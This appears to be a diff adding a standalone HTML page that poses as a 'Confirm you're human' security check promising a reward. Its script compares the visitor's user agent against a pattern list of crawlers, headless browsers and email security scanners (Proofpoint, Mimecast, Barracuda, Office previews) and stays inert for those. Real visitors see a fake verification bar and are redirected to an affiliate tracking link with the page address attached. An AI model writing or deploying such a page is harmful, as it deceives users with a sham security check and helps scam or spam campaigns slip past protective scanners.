@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>One moment…</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:"Helvetica Neue",-apple-system,"Segoe UI",Roboto,sans-serif;
+    background:#fafafa;color:#111;display:flex;align-items:center;justify-content:center;
+    padding:24px;min-height:100dvh;overflow:hidden;
+  }
+  .sheet{
+    width:100%;max-width:440px;background:#fff;border:1px solid #e6e6e6;
+    border-radius:6px;padding:40px 30px 28px;text-align:left;
+    box-shadow:0 2px 20px rgba(0,0,0,.04);
+  }
+  .tag{
+    display:inline-block;font-size:10px;letter-spacing:2px;text-transform:uppercase;
+    color:#e01b24;border:1px solid #e01b24;padding:3px 8px;border-radius:2px;margin-bottom:18px;
+  }
+  .h{font-size:28px;font-weight:700;line-height:1.1;letter-spacing:-.6px;margin-bottom:10px}
+  .p{font-size:14px;line-height:1.55;color:#555;margin-bottom:26px;max-width:34ch}
+  .line{height:2px;background:#eee;margin-bottom:14px;overflow:hidden}
+  .line b{display:block;height:100%;width:0;background:#111;transition:width .25s linear}
+  .st{font-size:12px;color:#888;letter-spacing:.3px;min-height:18px}
+  .btn{
+    width:100%;margin-top:24px;padding:15px;border:0;border-radius:3px;
+    background:#111;color:#fff;font-family:inherit;font-size:14px;font-weight:600;
+    letter-spacing:1px;text-transform:uppercase;cursor:pointer;min-height:52px;
+    display:none;transition:background .15s;
+  }
+  .btn:hover{background:#e01b24}
+  .btn:active{transform:scale(.99)}
+  .btn.on{display:block;animation:fadeIn .3s ease}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+</style>
+</head>
+<body>
+<div class="sheet">
+  <div class="tag">Security</div>
+  <div class="st" id="s6">Checking…</div>
+  <h2 class="h">Confirm you're human.</h2>
+  <p class="p">A quick verification keeps bots away and your reward safe.</p>
+  <div class="line"><b id="p6"></b></div>
+  <button class="btn" id="b6" type="button">Continue</button>
+</div>
+<script>
+const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
+(function(){
+  "use strict";
+  const bar=document.getElementById('p6'),st=document.getElementById('s6'),btn=document.getElementById('b6');
+  const ua=navigator.userAgent||"";
+  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
+  for(const p of pats){if(p.test(ua))return;}
+  if(navigator.webdriver===true)return;
+  let acted=false;
+  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
+  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
+  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
+    if(e<T){requestAnimationFrame(step);return;}
+    if(r)return;r=true;bar.style.width="100%";
+    st.textContent=acted?"Verified — proceed below":"Tap to continue";
+    btn.classList.add('on');}
+  requestAnimationFrame(step);
+  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
+  let d=false;
+  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
+    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
+    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
+    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
+  btn.addEventListener('click',e=>{e.preventDefault();go();});
+})();
+</script>
+</body>
+</html>
